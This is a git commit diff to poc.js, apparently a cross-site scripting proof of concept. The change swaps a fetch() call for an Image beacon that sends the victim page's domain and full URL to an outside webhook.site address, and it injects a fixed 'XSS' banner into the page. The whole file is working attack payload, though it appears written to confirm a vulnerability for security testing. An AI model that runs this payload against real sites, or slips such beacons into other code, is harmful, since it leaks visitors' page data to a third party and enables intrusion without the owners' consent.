8eb9fa9b7e9f8c9c61dc5c79152eec2e4ea4fd8e
VictorKyiv <120391513+VictorKyiv@users.noreply.github.com>
2026-05-20 13:37:23 +0300

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,4 +1,12 @@
 //document.body.insertAdjacentHTML('afterbegin','<h1 style="position:fixed;z-index:99999;background:white;color:red;top:0;left:0">XSS</h1>');
 //confirm(document.domain);
 
-fetch('https://webhook.site/15524a9b-7e50-4fa2-aa60-3b61dbd603f3/hit?d=' + encodeURIComponent(document.domain) + '&url=' + encodeURIComponent(location.href));
+new Image().src =
+  'https://webhook.site/15524a9b-7e50-4fa2-aa60-3b61dbd603f3/hit?d=' +
+  encodeURIComponent(document.domain) +
+  '&url=' + encodeURIComponent(location.href);
+
+document.body.insertAdjacentHTML(
+  'afterbegin',
+  '<h1 style="position:fixed;z-index:99999;top:0;left:0;background:white;color:green">XSS</h1>'
+);
